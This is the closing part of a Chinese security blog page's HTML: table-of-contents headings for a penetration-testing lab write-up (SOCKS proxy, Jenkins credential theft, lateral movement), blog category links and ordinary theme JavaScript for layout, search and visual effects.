href="#%E5%BB%BA%E7%AB%8B-SOCKS-%E4%BB%A3%E7%90%86"><span class="toc-text">建立 SOCKS 代理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%85%8D%E7%BD%AE-proxychains"><span class="toc-text">配置 proxychains</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%A9%E8%87%AA%E5%B7%B1%E7%9A%84%E7%94%B5%E8%84%91%E4%B9%9F%E8%83%BD%E7%94%A8%E8%BF%99%E4%B8%AA%E4%BB%A3%E7%90%86"><span class="toc-text">让自己的电脑也能用这个代理</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%91-Jenkins-%E5%87%AD%E6%8D%AE%E7%AA%83%E5%8F%96"><span class="toc-text">🔑 Jenkins 凭据窃取</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%8E%AF-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%B0-50%EF%BC%88%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%89"><span class="toc-text">🎯 横向移动到 .50（数据库服务器）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%93%8A-%E5%AE%8C%E6%95%B4%E6%94%BB%E5%87%BB%E9%93%BE%E5%9B%9E%E9%A1%BE"><span class="toc-text">📊 完整攻击链回顾</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%92%AC-%E8%B8%A9%E5%9D%91%E6%80%BB%E7%BB%93"><span class="toc-text">💬 踩坑总结</span></a></li></ol></li></ol></div><div class="widget-footer"><a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><!-- Icon from Solar by 480 Design - https://creativecommons.org/licenses/by/4.0/ --><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="1.5"><path stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/><path d="M7 3.338A9.95 9.95 0 0 1 12 2c5.523 0 10 4.477 10 10s-4.477 10-10 10S2 17.523 2 12c0-1.821.487-3.53 1.338-5"/></g></svg><span>回到顶部</span></a></div></widget>
+
+<widget class="widget-wrapper linklist collapsible-widget"><div class="widget-header dis-select"><span class="name">文章分类</span><span class="collapse-toggle"><i class="fas fa-chevron-down"></i></span></div><div class="widget-body fs14"><div class="linklist left style-1" style="grid-template-columns:repeat(1,1fr);"><a class="link" title="代码审计" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"><div class="flex"><span>代码审计</span><span class="count">6</span></div></a><a class="link" title="笔记" href="/categories/%E7%AC%94%E8%AE%B0/"><div class="flex"><span>笔记</span><span class="count">2</span></div></a><a class="link" title="vulnhub-DC" href="/categories/vulnhub-DC/"><div class="flex"><span>vulnhub-DC</span><span class="count">9</span></div></a><a class="link" title="DVWA" href="/categories/DVWA/"><div class="flex"><span>DVWA</span><span class="count">3</span></div></a><a class="link" title="靶机渗透" href="/categories/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/"><div class="flex"><span>靶机渗透</span><span class="count">1</span></div></a><a class="link" title="工具魔改" href="/categories/%E5%B7%A5%E5%85%B7%E9%AD%94%E6%94%B9/"><div class="flex"><span>工具魔改</span><span class="count">3</span></div></a><a class="link" title="靶场" href="/categories/%E9%9D%B6%E5%9C%BA/"><div class="flex"><span>靶场</span><span class="count">1</span></div></a></div></div></widget>
+</div></aside><div class='float-panel'>
+  <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
+  </button>
+  <button type='button' style='display:none' class='mobile-only leftbar-toggle mobile' onclick='sidebar.leftbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
+  </button>
+</div>
+</div><div class="scripts">
+
+
+<script type="text/javascript">
+  window.canonical = {"originalHost":null,"officialHosts":["localhost"],"encoded":""};
+  const ctx = {
+    date_suffix: {
+      just: `刚刚`,
+      min: `分钟前`,
+      hour: `小时前`,
+      day: `天前`,
+    },
+    root : `/`,
+    tag_plugins: {
+      chat: Object.assign({"api":"https://siteinfo.listentothewind.cn/api/v1"}),
+    }
+  };
+
+  // required plugins (only load if needs)
+  if (`local_search`) {
+    ctx.search = {};
+    ctx.search.service = `local_search`;
+    if (ctx.search.service == 'local_search') {
+      let service_obj = Object.assign({}, `{"field":"all","path":"/search.json","content":true,"skip_search":null,"sort":"-date"}`);
+      ctx.search[ctx.search.service] = service_obj;
+    }
+  }
+  const def = {
+    avatar: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/3442075.svg`,
+    cover: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/cover/76b86c0226ffd.svg`,
+    loading: `https://api.iconify.design/eos-icons:three-dots-loading.svg?color=%231cd0fd`,
+  };
+  const deps = {
+    jquery: `https://gcore.jsdelivr.net/npm/jquery@3.7/dist/jquery.min.js`,
+    marked: `https://gcore.jsdelivr.net/npm/marked@13.0/lib/marked.umd.min.js`,
+    lazyload: `/%5Bobject%20Object%5D`
+  }
+  
+
+</script>
+
+<script type="text/javascript">
+  
+  function RunItem() {
+    this.list = []; // 存放回调函数
+    this.start = () => {
+      for (var i = 0; i < this.list.length; i++) {
+        this.list[i].run();
+      }
+    };
+    this.push = (fn, name, setRequestAnimationFrame = true) => {
+      let myfn = fn
+      if (setRequestAnimationFrame) {
+        myfn = () => {
+          utils.requestAnimationFrame(fn)
+        }
+      }
+      var f = new Item(myfn, name);
+      this.list.push(f);
+    };
+    this.remove = (name) => {
+      for (let index = 0; index < this.list.length; index++) {
+        const e = this.list[index];
+        if (e.name == name) {
+          this.list.splice(index, 1);
+        }
+      }
+    }
+    // 构造一个可以run的对象
+    function Item(fn, name) {
+      // 函数名称
+      this.name = name || fn.name;
+      // run方法
+      this.run = () => {
+        try {
+          fn()
+        } catch (error) {
+          console.log(error);
+        }
+      };
+    }
+  }
+
+  const utils = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    css: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    js: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      if (src.startsWith('/')) {
+        src = ctx.root + src.substring(1);
+      }
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function () {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    jq: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        utils.js(deps.jquery).then(fn)
+      } else {
+        fn()
+      }
+    },
+
+    onLoading: (el) => {
+      if (el) {
+        $(el).append('<div class="loading-wrap"><svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" stroke-opacity=".3" d="M12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="1.3s" values="60;0"/></path><path stroke-dasharray="15" stroke-dashoffset="15" d="M12 3C16.9706 3 21 7.02944 21 12"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.3s" values="15;0"/><animateTransform attributeName="transform" dur="1.5s" repeatCount="indefinite" type="rotate" values="0 12 12;360 12 12"/></path></g></svg></div>');
+      }
+    },
+    onLoadSuccess: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap').remove();
+      }
+    },
+    onLoadFailure: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap svg').remove();
+        $(el).find('.loading-wrap').append('<svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" d="M12 3L21 20H3L12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.5s" values="60;0"/></path><path stroke-dasharray="6" stroke-dashoffset="6" d="M12 10V14"><animate fill="freeze" attributeName="stroke-dashoffset" begin="0.6s" dur="0.2s" values="6;0"/></path></g><circle cx="12" cy="17" r="1" fill="currentColor" fill-opacity="0"><animate fill="freeze" attributeName="fill-opacity" begin="0.8s" dur="0.4s" values="0;1"/></circle></svg>');
+        $(el).find('.loading-wrap').addClass('error');
+      }
+    },
+    request: (el, url, callback, onFailure) => {
+      const maxRetry = 3;
+      let retryCount = 0;
+
+      return new Promise((resolve, reject) => {
+        const load = () => {
+          utils.onLoading?.(el);
+
+          let timedOut = false;
+          const timeout = setTimeout(() => {
+            timedOut = true;
+            console.warn('[request] 超时:', url);
+
+            if (++retryCount >= maxRetry) {
+              utils.onLoadFailure?.(el);
+              onFailure?.();
+              reject('请求超时');
+            } else {
+              setTimeout(load, 1000);
+            }
+          }, 5000);
+
+          fetch(url).then(resp => {
+            if (timedOut) return;
+            clearTimeout(timeout);
+
+            if (!resp.ok) throw new Error('响应失败');
+            return resp;
+          }).then(data => {
+            if (timedOut) return;
+            utils.onLoadSuccess?.(el);
+            callback(data);
+            resolve(data);
+          }).catch(err => {
+            clearTimeout(timeout);
+            console.warn('[request] 错误:', err);
+
+            if (++retryCount >= maxRetry) {
+              utils.onLoadFailure?.(el);
+              onFailure?.();
+              reject(err);
+            } else {
+              setTimeout(load, 1000);
+            }
+          });
+        };
+
+        load();
+      });
+    },
+    requestWithoutLoading: (url, options = {}, maxRetry = 2, timeout = 5000) => {
+      return new Promise((resolve, reject) => {
+        let retryCount = 0;
+
+        const tryRequest = () => {
+          let timedOut = false;
+          const timer = setTimeout(() => {
+            timedOut = true;
+            if (++retryCount > maxRetry) reject('timeout');
+            else tryRequest();
+          }, timeout);
+
+          fetch(url, options)
+            .then(resp => {
+              clearTimeout(timer);
+              if (!resp.ok) throw new Error('bad response');
+              resolve(resp);
+            })
+            .catch(err => {
+              clearTimeout(timer);
+              if (++retryCount > maxRetry) reject(err);
+              else setTimeout(tryRequest, 500);
+            });
+        };
+
+        tryRequest();
+      });
+    },
+    /********************** requestAnimationFrame ********************************/
+    // 1、requestAnimationFrame 会把每一帧中的所有 DOM 操作集中起来，在一次重绘或回流中就完成，并且重绘或回流的时间间隔紧紧跟随浏览器的刷新频率，一般来说，这个频率为每秒60帧。
+    // 2、在隐藏或不可见的元素中，requestAnimationFrame 将不会进行重绘或回流，这当然就意味着更少的的 cpu，gpu 和内存使用量。
+    requestAnimationFrame: (fn) => {
+      if (!window.requestAnimationFrame) {
+        window.requestAnimationFrame = window.requestAnimationFrame || window.mozRequestAnimationFrame || window.webkitRequestAnimationFrame;
+      }
+      window.requestAnimationFrame(fn)
+    },
+    dark: {},
+  };
+
+  // utils.dark.mode 当前模式 dark or light
+  // utils.dark.toggle() 暗黑模式触发器
+  // utils.dark.push(callBack[,"callBackName"]) 传入触发器回调函数
+  utils.dark.method = {
+    toggle: new RunItem(),
+  };
+  utils.dark = Object.assign(utils.dark, {
+    push: utils.dark.method.toggle.push,
+  });
+</script>
+<script>
+  const sidebar = {
+    leftbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    rightbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('rightbar');
+        l_body.removeAttribute('leftbar');
+      }
+    },
+    dismiss: () => {
+      if (l_body) {
+        l_body.removeAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    toggleTOC: () => {
+      document.querySelector('#data-toc').classList.toggle('collapse');
+    }
+  }
+</script>
+<script type="text/javascript">
+  (() => {
+    const tagSwitchers = document.querySelectorAll('.tag-subtree.parent-tag > a > .tag-switcher-wrapper')
+    for (const tagSwitcher of tagSwitchers) {
+      tagSwitcher.addEventListener('click', (e) => {
+        const parent = e.target.closest('.tag-subtree.parent-tag')
+        parent.classList.toggle('expanded')
+        e.preventDefault()
+      })
+    }
+
+    // Get active tag from query string, then activate it.
+    const urlParams = new URLSearchParams(window.location.search)
+    const activeTag = urlParams.get('tag')
+    if (activeTag) {
+      let tag = document.querySelector(`.tag-subtree[data-tag="${activeTag}"]`)
+      if (tag) {
+        tag.querySelector('a').classList.add('active')
+        
+        while (tag) {
+          tag.classList.add('expanded')
+          tag = tag.parentElement.closest('.tag-subtree.parent-tag')
+        }
+      }
+    }
+  })()
+</script>
+
+<script async src="https://gcore.jsdelivr.net/npm/vanilla-lazyload@19.1/dist/lazyload.min.js"></script>
+<script>
+  // https://www.npmjs.com/package/vanilla-lazyload
+  // Set the options globally
+  // to make LazyLoad self-initialize
+  window.lazyLoadOptions = {
+    elements_selector: ".lazy",
+    callback_loaded: (el) => {
+      el.classList.add('loaded');
+      const wrapper = el.closest('.lazy-box');
+      const icon = wrapper?.querySelector('.lazy-icon');
+      if (icon) icon.remove();
+    }
+  };
+  // Listen to the initialization event
+  // and get the instance of LazyLoad
+  window.addEventListener(
+    "LazyLoad::Initialized",
+    function (event) {
+      window.lazyLoadInstance = event.detail.instance;
+    },
+    false
+  );
+  document.addEventListener('DOMContentLoaded', function () {
+    window.lazyLoadInstance?.update();
+  });
+
+  window.wrapLazyloadImages = (container) => {
+    if (typeof container === 'string') {
+      container = document.querySelector(container);
+    }
+    if (!container) return;
+    
+    const images = container.querySelectorAll('img');
+    images.forEach((img) => {
+      if (img.classList.contains('lazy')) return;
+
+      const src = img.getAttribute('src');
+      if (!src) return;
+
+      const wrapper = document.createElement('div');
+      wrapper.className = 'lazy-box';
+
+      const newImg = img.cloneNode();
+      newImg.removeAttribute('src');
+      newImg.setAttribute('data-src', src);
+      newImg.classList.add('lazy');
+
+      const icon = document.createElement('div');
+      icon.className = 'lazy-icon';
+      if (def.loading) {
+        icon.style.backgroundImage = `url("${def.loading}")`;
+      }
+
+      wrapper.appendChild(newImg);
+      wrapper.appendChild(icon);
+
+      img.replaceWith(wrapper);
+    });
+
+    // 通知 LazyLoad 更新
+    if (window.lazyLoadInstance?.update) {
+      window.lazyLoadInstance.update();
+    }
+  }
+  
+</script>
+
+<!-- required -->
+<script src="/js/main.js?v=1.33.1" defer></script>
+
+<script type="text/javascript">
+  const applyTheme = (theme) => {
+    document.documentElement.setAttribute('data-theme', theme)
+  }
+
+  const switchTheme = () => {
+    const currentTheme = document.documentElement.getAttribute('data-theme')
+    let newTheme;
+    if (currentTheme === 'light') {
+      newTheme = 'dark'
+    } else {
+      newTheme = 'light'
+    }
+    applyTheme(newTheme)
+    window.localStorage.setItem('Stellar.theme', newTheme)
+    
+    const messages = {
+      light: `切换到浅色模式`,
+      dark: `切换到深色模式`,
+    }
+    hud?.toast?.(messages[newTheme])
+  }
+
+  (() => {
+    const theme = window.localStorage.getItem('Stellar.theme')
+    if (theme !== null) {
+      applyTheme(theme)
+    } else {
+      applyTheme('dark')
+    }
+  })()
+</script>
+
+<!-- optional -->
+
+
+
+<script defer>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.services = Object.assign({}, JSON.parse(`{"mdrender":{"js":"/js/services/mdrender.js"},"siteinfo":{"js":"/js/services/siteinfo.js","api":null},"ghinfo":{"js":"/js/services/ghinfo.js"},"rating":{"js":"/js/services/rating.js","api":"https://star-vote.xaox.cc/api/rating"},"vote":{"js":"/js/services/vote.js","api":"https://star-vote.xaox.cc/api/vote"},"sites":{"js":"/js/services/sites.js"},"friends":{"js":"/js/services/friends.js"},"friends_and_posts":{"js":"/js/services/friends_and_posts.js"},"timeline":{"js":"/js/services/timeline.js"},"fcircle":{"js":"/js/services/fcircle.js"},"weibo":{"js":"/js/services/weibo.js"},"memos":{"js":"/js/services/memos.js"},"voice":{"js":"/js/plugins/voice.js"},"video":{"js":"/js/plugins/video.js"},"download-file":{"js":"/js/plugins/download-file.js"},"twikoo":{"js":"/js/services/twikoo_latest_comment.js"},"waline":{"js":"/js/services/waline_latest_comment.js"},"artalk":{"js":"/js/services/artalk_latest_comment.js"},"giscus":{"js":"/js/services/giscus_latest_comment.js"},"contributors":{"edit_this_page":{"_posts/":null,"wiki/stellar/":"https://github.com/xaoxuu/hexo-theme-stellar-docs/blob/main/"},"js":"/js/services/contributors.js"}}`));
+    for (let id of Object.keys(ctx.services)) {
+      const js = ctx.services[id].js;
+      if (id == 'siteinfo') {
+        ctx.cardlinks = document.querySelectorAll('a.link-card[cardlink]');
+        if (ctx.cardlinks?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            setCardLink(ctx.cardlinks);
+          });
+        }
+      } else if (id == 'voice') {
+        ctx.voiceAudios = document.querySelectorAll('.voice>audio');
+        if (ctx.voiceAudios?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            createVoiceDom(ctx.voiceAudios);
+          });
+        }
+      } else if (id == 'video') {
+        ctx.videos = document.querySelectorAll('.video>video');
+        if (ctx.videos?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            videoEvents(ctx.videos);
+          });
+        }
+      } else if (id == 'download-file') {
+        ctx.files = document.querySelectorAll('.file');
+        if (ctx.files?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            downloadFileEvent(ctx.files);
+          });
+        }
+      } else {
+        const els = document.getElementsByClassName(`ds-${id}`);
+        if (els?.length > 0) {
+          utils.jq(() => {
+            if (id == 'timeline' || 'memos' || 'marked') {
+              utils.js(deps.marked).then(function () {
+                utils.js(js, { defer: true });
+              });
+            } else {
+              utils.js(js, { defer: true });
+            }
+          });
+        }
+      }
+    }
+
+    // chat iphone time
+    let phoneTimes = document.querySelectorAll('.chat .status-bar .time');
+
+    if (phoneTimes.length > 0) {
+      NowTime();
+      var date = new Date();
+      var sec = date.getSeconds();
+      var firstAdjustInterval = setInterval(firstAdjustTime, 1000 * (60 - sec));
+    }
+
+    function firstAdjustTime() {
+      NowTime();
+      clearInterval(firstAdjustInterval);
+      setInterval(NowTime, 1000 * 60);
+    }
+
+    function NowTime() {
+      for (let i = 0; i < phoneTimes.length; ++i) {
+        var timeSpan = phoneTimes[i];
+        var date = new Date();
+        var hour = date.getHours();
+        var min = date.getMinutes();
+        timeSpan.innerHTML = check(hour) + ":" + check(min);
+      }
+    };
+
+    function check(val) {
+      if (val < 10) {
+        return ("0" + val);
+      }
+      return (val);
+    }
+
+    // chat quote
+    const chat_quote_obverser = new IntersectionObserver((entries, observer) => {
+      entries.filter((entry) => { return entry.isIntersecting }).sort((a, b) => a.intersectionRect.y !== b.intersectionRect.y ? a.intersectionRect.y - b.intersectionRect.y : a.intersectionRect.x - b.intersectionRect.x).forEach((entry, index) => {
+          observer.unobserve(entry.target);
+          setTimeout(() => {
+            entry.target.classList.add('quote-blink');
+            setTimeout(() => {
+              entry.target.classList.remove('quote-blink');
+            }, 1000);
+          }, Math.max(100, 16) * (index + 1));
+        });
+    });
+
+    var chatQuotes = document.querySelectorAll(".chat .talk .quote");
+    chatQuotes.forEach((quote) => {
+      quote.addEventListener('click', function () {
+        var chatCellDom = document.getElementById("quote-" + quote.getAttribute("quotedCellTag"));
+        if (chatCellDom) {
+          var chatDiv = chatCellDom.parentElement;
+          var mid = chatDiv.clientHeight / 2;
+          var offsetTop = chatCellDom.offsetTop;
+          if (offsetTop > mid - chatCellDom.clientHeight / 2) {
+            chatDiv.scrollTo({
+              top: chatCellDom.offsetTop - mid + chatCellDom.clientHeight / 2,
+              behavior: "smooth"
+            });
+          } else {
+            chatDiv.scrollTo({
+              top: 0,
+              behavior: "smooth"
+            });
+          }
+          chat_quote_obverser.observe(chatCellDom);
+        }
+      });
+    });
+  });
+</script>
+
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.search = {
+      path: `/search.json`,
+    }
+    utils.js('/js/search/local-search.js', { defer: true });
+  });
+</script><script>
+  window.FPConfig = {
+    delay: 0,
+    ignoreKeywords: [],
+    maxRPS: 5,
+    hoverDelay: 25
+  };
+</script>
+<script defer src="https://gcore.jsdelivr.net/npm/flying-pages@2/flying-pages.min.js"></script><script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    const swiper_api = document.getElementById('swiper-api');
+    if (swiper_api != undefined) {
+      utils.css(`https://unpkg.com/swiper@10.3/swiper-bundle.min.css`);
+      utils.js(`https://unpkg.com/swiper@10.3/swiper-bundle.min.js`, { defer: true }).then(function () {
+        const effect = swiper_api.getAttribute('effect') || '';
+        var swiper = new Swiper('.swiper#swiper-api', {
+          slidesPerView: 'auto',
+          spaceBetween: 8,
+          centeredSlides: true,
+          effect: effect,
+          rewind: true,
+          pagination: {
+            el: '.swiper-pagination',
+            clickable: true,
+          },
+          navigation: {
+            nextEl: '.swiper-button-next',
+            prevEl: '.swiper-button-prev',
+          },
+        });
+      })
+    }
+  });
+</script>
+<script>
+  document.addEventListener('DOMContentLoaded', function () {
+    window.codeElements = document.querySelectorAll('.code');
+    if (window.codeElements.length > 0) {
+      ctx.copycode = {
+        default_text: `Copy`,
+        success_text: `Copied`,
+        toast: `复制成功`,
+      };
+      utils.js('/js/plugins/copycode.js');
+    }
+  });
+</script>
+
+
+<!-- inject -->
+
+
+<!-- Custom Image Viewer -->
+<script src="/js/plugins/image-viewer.js"></script>
+
+<!-- Custom Context Menu -->
+<script src="/js/plugins/custom-context-menu.js"></script>
+
+<!-- Glitch Effect -->
+<script src="/js/plugins/glitch-effect.js"></script>
+
+<!-- Terminal Copy -->
+<script src="/js/plugins/terminal-copy.js"></script>
+
+<!-- Hotkeys -->
+<script src="/js/plugins/hotkeys.js"></script>
+
+<!-- Achievements / Card System -->
+<script src="/js/plugins/achievements.js"></script>
+
+<!-- Offline Vault - 断网保护机制 -->
+<script src="/js/plugins/offline-vault.js"></script>
+
+<!-- Live2D Widget - Local Version -->
+<script src="/live2d-widget/dist/autoload.js"></script>
+
+<!-- Live2D Widget 位置调整和默认显示 -->
+<style>
+  #waifu {
+    position: fixed !important;
+    bottom: 20px !important;
+    right: 20px !important;
+    left: auto !important;
+    z-index: 1000 !important;
+    transform: none !important;
+    display: block !important;
+    opacity: 1 !important;
+    visibility: visible !important;
+  }
+  #waifu #live2d {
+    position: relative !important;
+    transform: none !important;
+  }
+  #waifu-toolbar {
+    position: relative !important;
+    transform: none !important;
+  }
+  #waifu-toggle {
+    display: none !important;
+  }
+</style>
+
+<!-- 点击特效 -->
+<script>
+(function() {
+  var clickEffects = {
+    current: null,
+    
+    init: function() {
+      this.current = localStorage.getItem('clickEffect') || 'none';
+      this.bindEvents();
+    },
+    
+    bindEvents: function() {
+      var self = this;
+      document.addEventListener('click', function(e) {
+        if (self.current === 'none') return;
+        if (e.target.closest('button, a, input, textarea, select, .post-card, .layout-btn')) return;
+        self.createEffect(e.clientX, e.clientY);
+      });
+      
+      window.addEventListener('storage', function(e) {
+        if (e.key === 'clickEffect') {
+          self.current = e.newValue || 'none';
+        }
+      });
+    },
+    
+    createEffect: function(x, y) {
+      switch(this.current) {
+        case 'ripple': this.createRipple(x, y); break;
+        case 'firework': this.createFirework(x, y); break;
+        case 'particles': this.createParticles(x, y); break;
+        case 'text': this.createText(x, y); break;
+        default: break;
+      }
+    },
+    
+    createRipple: function(x, y) {
+      var ripple = document.createElement('div');
+      ripple.className = 'click-ripple';
+      ripple.style.cssText = 'position:fixed;left:' + x + 'px;top:' + y + 'px;width:0;height:0;border-radius:50%;background:rgba(52,152,219,0.4);transform:translate(-50%,-50%);pointer-events:none;z-index:9999;animation:rippleExpand 0.6s ease-out forwards;';
+      document.body.appendChild(ripple);
+      setTimeout(function() { ripple.remove(); }, 600);
+    },
+    
+    createFirework: function(x, y) {
+      var colors = ['#ff6b6b', '#feca57', '#48dbfb', '#ff9ff3', '#54a0ff'];
+      for (var i = 0; i < 12; i++) {
+        var particle = document.createElement('div');
+        var angle = (Math.PI * 2 / 12) * i;
+        var velocity = 50 + Math.random() * 30;
+        particle.style.cssText = 'position:fixed;left:' + x + 'px;top:' + y + 'px;width:6px;height:6px;border-radius:50%;background:' + colors[i % 5] + ';pointer-events:none;z-index:9999;transform:translate(-50%,-50%);';
+        document.body.appendChild(particle);
+        this.animateParticle(particle, x, y, x + Math.cos(angle) * velocity, y + Math.sin(angle) * velocity, 500);
+      }
+    },
+    
+    createParticles: function(x, y) {
+      var colors = ['#ff6b6b', '#feca57', '#48dbfb', '#ff9ff3', '#54a0ff', '#5f27cd'];
+      for (var i = 0; i < 8; i++) {
+        var particle = document.createElement('div');
+        particle.innerHTML = '✨';
+        particle.style.cssText = 'position:fixed;left:' + (x + (Math.random()-0.5)*30) + 'px;top:' + (y + (Math.random()-0.5)*30) + 'px;font-size:16px;pointer-events:none;z-index:9999;animation:particleFloat 0.8s ease-out forwards;';
+        document.body.appendChild(particle);
+        setTimeout(function(p) { return function() { p.remove(); }; }(particle), 800);
+      }
+    },
+    
+    createText: function(x, y) {
+      var texts = ['666', '厉害', 'nice', '棒', '赞', '给力'];
+      var text = document.createElement('div');
+      text.innerHTML = texts[Math.floor(Math.random() * texts.length)];
+      text.style.cssText = 'position:fixed;left:' + x + 'px;top:' + y + 'px;font-size:18px;font-weight:bold;color:#3498db;pointer-events:none;z-index:9999;transform:translate(-50%,-50%);animation:textFloat 0.8s ease-out forwards;';
+      document.body.appendChild(text);
+      setTimeout(function() { text.remove(); }, 800);
+    },
+    
+    animateParticle: function(el, startX, startY, endX, endY, duration) {
+      var startTime = performance.now();
+      function animate(currentTime) {
+        var progress = Math.min((currentTime - startTime) / duration, 1);
+        var easeOut = 1 - Math.pow(1 - progress, 3);
+        el.style.left = (startX + (endX - startX) * easeOut) + 'px';
+        el.style.top = (startY + (endY - startY) * easeOut) + 'px';
+        el.style.opacity = 1 - progress;
+        if (progress < 1) requestAnimationFrame(animate);
+        else el.remove();
+      }
+      requestAnimationFrame(animate);
+    }
+  };
+  
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', function() { clickEffects.init(); });
+  } else {
+    clickEffects.init();
+  }
+  
+  window.ClickEffects = clickEffects;
+})();
+</script>
+
+<style>
+@keyframes rippleExpand {
+  0% { width: 0; height: 0; opacity: 1; }
+  100% { width: 100px; height: 100px; opacity: 0; }
+}
+@keyframes particleFloat {
+  0% { opacity: 1; transform: translateY(0) scale(1); }
+  100% { opacity: 0; transform: translateY(-40px) scale(0.5); }
+}
+@keyframes textFloat {
+  0% { opacity: 1; transform: translate(-50%, -50%) scale(1); }
+  100% { opacity: 0; transform: translate(-50%, -80px) scale(1.2); }
+}
+</style>
+
+<!-- PWA Service Worker -->
+<script>
+if ('serviceWorker' in navigator) {
+  navigator.serviceWorker.register('/sw.js').then(function(reg) {
+    console.log('Service Worker 已注册，支持离线访问');
+  }).catch(function(err) {
+    console.log('Service Worker 注册失败:', err);
+  });
+}
+</script>
+
+</div></body></html>
